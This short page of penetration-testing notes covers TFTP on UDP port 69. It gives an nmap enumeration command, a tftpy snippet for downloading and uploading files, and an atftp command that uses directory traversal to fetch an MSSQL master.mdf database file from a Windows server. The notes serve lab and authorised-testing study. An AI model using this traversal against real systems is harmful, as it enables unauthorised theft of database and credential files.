---
description: sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.11.1.111
---

# TFTP UDP 69

```
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)
```

```
atftp
get ../../../PROGRA~1/MICROS~1/MSSQL14.SQLEXPRESS/MSSQL/DATA/master.mdf master2.mdf
```
